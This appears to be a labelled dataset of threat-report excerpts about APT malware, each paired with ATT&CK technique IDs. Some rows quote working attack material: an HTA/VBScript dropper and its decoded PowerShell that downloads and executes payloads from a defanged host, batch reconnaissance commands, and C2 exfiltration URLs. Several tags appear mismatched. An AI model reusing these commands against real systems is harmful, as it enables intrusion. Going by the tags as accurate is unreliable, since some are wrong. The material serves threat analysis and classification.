The switch statement checks for 19 cases, between 101 and 119. (Updated to correct command IDs, thanks @mykill!)    Command ID Function   Description   101 getInfoOSX Gathers username and OSX version and responds using the encrypted form of the following string: “Mac OS X – [OSX version] x64<br>\nUser name – [username]”   102 getProcessList Runs “ps aux” to obtain a list of running processes   103 remoteShell Runs supplied command using “/bin/sh”   104 getInstalledAPP Gets a list of installed applications by running the command “ls -la /Applications”   105 showBackupIosFolder Checks to see if an IOS device was backed up to the system by running the command “ls -la ~/Library/Application\ Support/MobileSync/Backup/”   106 downloadFileFromPath Uploads a file from a specified path   107 createFileInSystem Downloads a file, specifically provided within the C2 server’s HTTP response   108 execFile Executes a specified file on the system using the NSTask:launch method   109 deletFileFromPath Deletes a specified file using the NSFileManager:removeFileAtPath method   110 takeScreenShot Takes a screenshot using the CGGetActiveDisplayList, CGDisplayCreateImage, NSImage:initWithCGImage methods	['T1070.006', 'T1071', 'T1106']
The threat actor’s main objective for using this RAT (known as Razy/NeD worm/Wonder Botnet) was obvious from the victim data that was collected – it was to search for specific file extensions such as PDF, DOC, DOCX, XLS, and XLSX, where they are compressed in RAR files per category, stored in temp directories within a folder named by victim ID (bot ID – long MD5 string), encrypted and uploaded to the C2	['T1005', 'T1083', 'T1074']
The tool runs the following list of WMI queries:  wmic logicaldisk get Caption, Description,VolumeSerialNumber,Size,FreeSpace wmic diskdrive get Model, SerialNumber wmic computersystem get Manufacturer, Model, Name, SystemTypec wmic os get Caption, OSArchitecture, OSLanguage,SystemDrive,MUILanguages wmic process get Caption,ExecutablePath  The URL used to send the system information, running processes and a screenshot to the C2 server is: hxxp://145.249.105[.]165/resource-store/stockroom-center-service/check.php?fm=[serial number] The C# variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows: spp=[system information from WMI queries] &spvg=[screenshot in JPEG format] Conclusion The Sofacy group continues their attacks on organizations across the globe using similar tactics and techniques	['T1047', 'T1057', 'T1041']
The Trojan checks the modified time of the file by creating an HTTP request to a URL structured as follows: <Google Drive URL in ‘gdu’> + <file identifier> + “?supportTeamDrives=true&fields=modifiedTime” The Trojan then uses the following regular expression to obtain the modified time of the file from the HTTP response, which is saved to the variable named modification_time: \”modifiedTime\”:(.*) The Trojan then uploads a second file to the Google Drive, the purpose of which is to allow the Trojan to continually write to this file as it waits for the actor to modify the first file uploaded	['T1070.006', 'T1074', 'T1547.009', 'T1105']
The Trojan compares the TimeZone.CurrentTimeZone.DaylightName property to strings Iran, Arab, Arabia and Middle East, which will match the following time zones in Windows:   Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5) According to MSDN, these five time zones encompass 10 countries that fall within UTC+2, +3, +3.5 or +4 as seen in Figure 3	['T1070.006', 'T1124']
The Trojan downloads the contents of this file by crafting an HTTP request to a URL structured as follows: <Google Drive URL in ‘gdu’> + <first file identifier> + “?alt=media” With the contents of the file downloaded, the Trojan sets the modification_time variable to the current modification time so the Trojan knows when the actor makes further changes to the file	['T1070.006', 'T1083', 'T1105']
The Trojan will convert these hexadecimal bytes to their binary values and write them to a file and will run the file using the “open” function using the ShellExecuteW API function	['T1106', 'T1140']
"The URL used can be found in the embedded OLE object:hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]Here is the source code of the downloaded HTA document:<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""><html xmlns=""http://www.w3.org/1999/xhtml""><head><meta content=""text/html; charset=utf-8"" http-equiv=""Content-Type"" /><title>Bonjour</title><script language=""VBScript"">Set owFrClN0giJ = CreateObject(""Wscript.Shell"")Set v1ymUkaljYF = CreateObject(""Scripting.FileSystemObject"")If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings(""%PSModulePath%"") + ""..\powershell.exe"") ThenowFrClN0giJ.Run ""powershell -nop -windowstyle hidden -executionpolicy bypass -encodedcommand JABjAD0AbgBlAHcALQBvA[...redacted...]H0AIAA="" ,0owFrClN0giJ.Run ""cmd /c echo hta>%tmp%\webbrowser1094826604.tmp"", 0End IfSelf.Close</script><hta:applicationid=""oHTA""applicationname=""Bonjour""application=""yes""></head></html>Once decoded using the base64 algorithm, we are able to read the final payload:$c=new-object System.Net.WebClient$t =$env:temp$t1=$t+""\\alitmp0131.jpg""$t2=$t+""\\alitmp0132.jpg""$t3=$t+""\\alitmp0133.js""try  {    echo $c.DownloadFile( ""hxxp://old[.]jrchina[.]com/btob_asiana/appach01.jpg"",$t1)    $c.DownloadFile( ""hxxp://old[.]jrchina[.]com/btob_asiana/appach02.jpg"",$t2)    $c.DownloadFile( ""hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp"",$t3)    wscript.exe $t3  }catch  {   }The purpose of this script is to download and execute a Windows script and two encoded payloads"	['T1071', 'T1064']
The v.vbs script drops four components (hUpdateCheckers.base, dUpdateCheckers.base, cUpdateCheckers.bat, and GoogleUpdateschecker.vbs) to the directory: C:\ProgramData\Windows\Microsoft\java\ v.vbs uses CertUtil.exe, a legitimate Microsoft command-line program installed as part of Certificate Services, to decode the base64-encoded files hUpdateCheckers.base and dUpdateCheckers.base, and drop hUpdateCheckers.ps1 and dUpdateCheckers.ps1 to the staging directory	['T1036', 'T1074', 'T1064']
The VB.NET variant then gathers system information and running processes like other Zebrocy variants by running the following commands: systeminfo & tasklist The URL used to send the system information, running processes and a screenshot to the C2 server is: hxxp://109.248.148[.]42/agr-enum/progress-inform/cube.php?res=[serial number] The VB.NET variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows (notice the spaces before and after ampersand “&”): data=[system information and running processes] & arg=[screenshot in BMP format] C# Zebrocy Variant The C# variant of Zebrocy is similar to other variants in functionality, but also has several unique attributes that are worth discussing	['T1082', 'T1057', 'T1132']
The weaponized Office documents were found to be hosted either on what appeared to be compromised legitimate websites, or on websites using domain names similar to legitimate domain names in appearance	['T1036', 'T1102']
The White Atlas framework often utilized a small Javascript script to execute the malware dropper payload after it was decrypted by the VBA macro code, then to delete the dropper afterwards	['T1070.004', 'T1064']
The x command treats the supplied data as a PowerShell script that it will write to the current PowerShell script (Office365DCOMCheck.ps1/SystemDiskClean.ps1), effectively overwriting the initial PowerShell script with a secondary payload script	['T1064', 'T1059.001']
BE2 also uses start menu locations for persistence: UsersuserAppDataRoamingMicrosoftWindowsStart	['T1007', 'T1036', 'T1074']
The “Excel” command receives another stage of the PowerShell code, saves it in “c:\programdata\a.ps1” and then asks Excel to execute this PowerShell script via DDE	['T1059', 'T1059.001']
This account was suspended in short order, but immediately after the suspension, an alternate account with the username @dookhtegan1 with the same stylized profile image appeared and is still currently active	['T1033', 'T1087']
This decrypted data is written to the following location:  %TEMP%\WUpdate.~tmp  This ‘WUpdate.~tmp’ file is then copied to a filename of ‘Applet.cpl’, which is placed in the previously identified file path	['T1140', 'T1074']
This DLL file creates a scheduled task named BaiduUpdateTask1, which attempts to run the malicious, spoofed MSBuild.exe every subsequent minute	['T1053.005', 'T1036']
This file is written to the following file path:  % TEMP%\Update.~tmp  After the file is written, it is then copied to a filename of ’winhelp.cpl’ in the directory that was initially chosen	['T1070.006', 'T1036', 'T1074']
This has led it to do more, such as:  Communication with more C&C servers – up to 16 P2P communication between infected nodes MAC address check - PlugX runs if the MAC address of an infected host coincides with configuration information in itself (If not specified in the configuration, PlugX runs on any host)	['T1082', 'T1016']
This indicates that the attackers stole and modified a legitimate document from the compromised user account, crafted a malicious decoy Word macro document using this stolen document and sent it to the target recipient who might be expecting the email from the original account user before the real sender had time to send it	['T1598.002', 'T1087', 'T1204']
This is a classic RAT that can download, upload, execute commands on the victim host and, finally, perform keylogging	['T1056', 'T1105']
This is performed by checking if the following libraries are loaded on the victim machine.SbieDll.dll (sandboxie library)Dbghelp.dll (Microsoft debugging tools)Api_log.dll (threatAnalyzer / GFI SandBox)Dir_watch.dll (threatAnalyzer / GFI SandBox)We were able to uncover some other techniques used by this variant of ROKRAT to make analysis difficult, Group 123 used an anti-debugging technique related to NOP (No Operation).nop dword ptr [eax+eax+00h] is a 5 byte NOP	['T1574.001', 'T1574.002']
This log contains the external IP, the geographic location, the machine name, the time the machine was infected, as well as fields to be logged in the threat actor’s database	['T1070', 'T1124']
This particular sample connected to the CnC domain accounts.serveftp[.]com, which resolved to an IP address previously used by the threat group, although the IP had not been used for some time prior to this most recent activity:  MD5      0beb957923df2c885d29a9c1743dd94b  accounts.serveftp.com  59.188.0.197   BUBBLEWRAP is a full-featured backdoor that is set to run when the system boots, and can communicate using HTTP, HTTPS, or a SOCKS proxy	['T1071', 'T1016']
This plugin provides the attacker with the ability to both list files and download/upload files on the victim machine	['T1083', 'T1105']
This shortcut file points to ‘C:\Windows\system32\rundll32.exe “%APPDATA%\cnagnt.dll”,Sd’    One of the exceptions to the installation routine above is in the event Symantec is detected	['T1218.011', 'T1547.009']
This task is executed every 25 minutes and will repeat the actions described above – recreating the JavaScript code which later will create and execute a PowerShell script (described below)	['T1064', 'T1059.001']
Thread Name   Description    Key logger  Logs key strokes for configured processes and sends them to the command and control (C2) server    Form grabber  Monitors HTTP traffic for form data and sends it to the C2 server    POS monitor  Monitors for changes to logs stored in C:\NSB\Coalition\Logs and nsb.pos.client.log and sends parsed data to the C2 server    PST monitor  Searches recursively for newly created Outlook personal storage table (PST) files within user directories and sends them to the C2 server    HTTP proxy monitor  Monitors HTTP traffic for requests sent to HTTP proxies, saves the proxy address and credentials for future use	['T1071', 'T1090', 'T1041', 'T1132', 'T1486']
Threat actor using appcmd to delete logs and disable logging	['T1562.001', 'T1070.004']
To create the scheduled task, the PowerShell payload starts by writing the following to a VBScript file with the same name as the task name  (ex	['T1053.005', 'T1036']
To install the payload, the script will create a file %APPDATA%\OneDrive.bat and save the following string to it: powershell.exe -WindowStyle Hidden -exec bypass  -File “%APPDATA%\OneDrive.ps1” The script then writes a modified copy of itself to %APPDATA%\OneDrive.ps1, with the code that performs this installation omitted	['T1036', 'T1064']
To set up persistence, the loader creates a folder named “c:\temp”, sets its attributes to be a hidden and system folder to hide the folder from view in Windows Explorer	['T1547.001', 'T1564.001']
Tweets by second account @dookhtegan1 providing a Telegram channel with the leaked files Data Dump Contents The contents of the data dump includes various types of datasets that appear to be results from reconnaissance activity, initial compromises, and tools the OilRig operators use against target organizations	['T1003', 'T1041']
Unpacking routine for SWF exploit The exploit is a memory corruption vulnerability that exists in the “com.adobe.tvsdk.mediacore.BufferControlParameters” class.  If the exploit is successful, it will gain arbitrary read / write operations within memory, thus allowing it to execute a second stage shellcode	['T1068', 'T1203']
Upon execution, the “Windows Folder.exe” file copies itself to C:\Users\<username>\AppData\Roaming and creates a Windows shortcut (LNK) file in the victim’s Startup directory as a persistence mechanism	['T1074', 'T1547.009']
Upon execution, this command extracted, decrypted, and executed the PowerShell backdoor payload stored in the HiveUploadTask text property of the RacTask class	['T1140', 'T1059.001']
Variable Name Description   gdu Google Drive URL for downloading files to the Google Drive account   gduu Google Drive URL for uploading files to the Google Drive account   gdue Google Drive URL for updating a file on the Google Drive account   gdo2t Google Drive URL used to get the OAUTH access_token   client_id The client_id for the OAUTH application   cs The client_secret for OAUTH   r_t The refresh_token for OAUTH    Table 6 Variables used to store settings needed to use Google Drive as a C2 To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data	['T1102']
Victims are targeted by watering hole attacks, and emails with links to malicious websites or with malicious attachments	['T1598.003', 'T1189']
Watch on Fox News: Hackers may use fake Netflix app to spy on users As users have become more attached to their mobile devices, they want everything on those devices	['T1120', 'T1087']
We are still analyzing this Trojan to determine the specific structure of the data sent between the Trojan and the C2 server; however, it does appear that the Trojan is using the RC4 algorithm to encrypt data sent to the C2 server within HTTP POST requests	['T1573', 'T1041']
We are unsure of the shellcode hosted at this URL, but it is possible that additional shellcode-based payloads like Meterpreter could have been served by this shellcode	['T1064', 'T1105']
We determined this by following the process in which the TwoFace++ loader webshell uses the actor provided password to authenticate and decrypt the embedded webshell:  Append a string to the password that acts as a salt Obtain the SHA1 hash of the resulting string containing the password and salt Base64 encode the SHA1 hash Compare the encoded hash with hardcoded base64 string If the encoded hash matches hardcoded base64 string then the inbound request is authenticated Generates the SHA256 hash of the password string Base64 encodes the SHA256 hash and uses the first 24 characters as a key Uses 24-character key and the 3DES cipher to decrypt the embedded webshell  Now let’s look at how this works with the values in the TwoFace++ loader sample	['T1573', 'T1140', 'T1027', 'T1550.002', 'T1132']
We found two obfuscation techniques applied to the script: the first one changing the representation of variables; the second one changing the representation of strings in the script	['T1562.001', 'T1027']
We have gathered three samples of the default loader associated with this group and extracted the following configurations:    SHA256 of Sample Configuration   82779504d3fa0ffc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190 LAUNCHER_ARGS=[‘–host’, ‘www1.chrome-up[.]date:4443’, ‘-t’, ‘obfs3’]   db453b8de1a01a3e4d963847c0a0a45fb7e1a9b9e6d291c8883c74019f2fc91f LAUNCHER_ARGS=[‘–host’, ‘www1.chrome-up[.]date:4443’, ‘-t’, ‘obfs3’]   7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73 LAUNCHER_ARGS=[‘–host’, ‘139.59.46[.]154:3543’, ‘-t’, ‘obfs3’]      These configurations show that this group uses both fully-qualified domain names and IP addresses to host their Pupy C2 servers	['T1016', 'T1102', 'T1008']
We have observed the following capabilities of this payload:  Get drive information Read files Write files Delete files Move files Spawn processes Create directories   Reaver TCP Payload The malicious CPL payload of Reaver has the following three exported functions:  ServiceMain CPlApplet DllEntryPoint  When the malware is initially loaded, DllEntryPoint will be called, which in turn will call a function that is responsible for decompressing a blob of data	['T1005', 'T1070.004', 'T1083']
"We observed the threat group issue the following commands:  @echo off    dir c:\ >> %temp%\download    ipconfig /all >> %temp%\download    net user >> %temp%\download    net user /domain >> %temp%\download    ver >> %temp%\download    del %0    @echo off    dir ""c:\Documents and Settings"" >> %temp%\download    dir ""c:\Program Files\    "" >> %temp%\download    net start >> %temp%\download    net localgroup administrator >> %temp%\download    netstat -ano >> %temp%\download   These commands allow the threat group to gain information about the compromised computer and the network to which it belongs"	['T1007', 'T1105', 'T1059.001']
We’ve seen two onion addresses used in different samples:  g5wcesdfjzne7255.onion (Down) r2elajikcosf7zee.onion (Alive at time of writing)  The HTTP resource always starts with /api/osx/ and contains actions such as:  /api/osx/started to report the bot has just started /api/osx/keychain to exfiltrate the content of the keychain /api/osx/get_task?bot_id={botid}&version={version} to request a task (described below) /api/osx/cmd_executed to report a the output of a command that was executed /api/osx/task_complete?bot_id={botid}&task_id={taskid} to report a task was completed  HTTP POST content has two fields: bot_id and data	['T1071', 'T1106']
When communicating with its C2 server, the downloaders use multiple protocols, specifically HTTPS, HTTP or DNS, each of which provide a fallback channel in that order	['T1071', 'T1008']
When comparing the provided timestamps of the delivery documents to the timestamps for the remote template documents from Table 2, we find that the time to attack is directly correlated to the last time the templates are modified	['T1070.006', 'T1124']
When executed, the .NET Framework wrapper will first check if VMware tools is running in background, this is done via a simple process check, searching for any process named “vmtoolsd.” Provided there are no matching processes running, the malware continues execution, creating a registry entry with the name ‘MSASCuiLTasks’ in HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce for persistence	['T1057', 'T1547.001']
When generating the URL for the HTTP requests issued to the C2 server, the Trojan chooses a random folder from the following to include within the URL path: watch/? search/? find/? results/? open/? search/? close/? XAgent also will choose several parameters names from the following list when finishing the construction of the C2 URL: itwm= text= from=	['T1071', 'T1083']
When one PlugX succeeds to infect a host, it then accesses to every IP address in the local network one-by-one and communicate with any connectable nodes, using one of the following protocols listed in Table 2	['T1016', 'T1008']
When the actor modifies the file and changes the modification_time, the Trojan downloads the contents from the file by creating an HTTP request to a URL structured as follows: <Google Drive URL in ‘gdu’> + <file identifier in ‘f_id’> + “?alt=media” The Trojan processes the downloaded data within the file the same way it would to obtain a job from data received from the DNS tunneling channel using the TXT query mode, specifically by searching the data using the following regular expression: ([^r-v\\s]+)[r-v]([\\w\\d+\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>) The Trojan function splits the matching data, specifically the subdomain on a separator that is a character between r and v and uses the data before the separator to get the sequence number and a Boolean value (0 or 1) if more data is expected	['T1074', 'T1041', 'T1048', 'T1486']
"While the seller specifies that HawkEye Reborn should only be used on systems with permission, they also explicitly forbid scanning of HawkEye Reborn executables using antivirus software, likely an attempt to minimize the likelihood that anti-malware solutions will detect HawkEye Reborn binaries.Following these changes, the new developer of HawkEye Reborn has continued to make changes and we expect this to continue as long as the developer can monetize their efforts.As with other malware that we wrote about last year, while the developer claims that the software should only be used on systems with permission, or ""for educational purposes,"" malicious attackers have been continuously leveraging it against various targets around the world.Distribution campaignsFor several months during the last half of 2018 and continuing into 2019, Cisco Talos has observed ongoing malicious email campaigns that are being used to distribute versions of the HawkEye Reborn keylogger/stealer"	['T1518.001', 'T1018']
Year  Country  Industry  Malware  2014  Vietnam  Network Security  WINDSHIELD  2014  Germany  Manufacturing  WINDSHIELD  2015  Vietnam  Media  WINDSHIELD  2016  Philippines  Consumer products  KOMPROGO WINDSHIELD SOUNDBITE BEACON   2016  Vietnam  Banking  WINDSHIELD  2016  Philippines  Technology Infrastructure  WINDSHIELD  2016  China  Hospitality  WINDSHIELD  2016  Vietnam  Media  WINDSHIELD  2016  United States  Consumer Products  WINDSHIELD PHOREAL BEACON SOUNDBITE  Table 1: APT32 Private Sector Targeting Identified by FireEye APT32 Interest in Political Influence and Foreign Governments In addition to focused targeting of the private sector with ties to Vietnam, APT32 has also targeted foreign governments, as well as Vietnamese dissidents and journalists since at least 2013	['T1068']
استطلاع.docx https://0utl00k[.]net/docs    Table 1 Additional DarkHydrus Word documents used to steal credentials Both of these related documents use the attachedTemplate technique to steal credentials by sending them to a URL https://0utl00k[.]net/docs	['T1003', 'T1552.001']
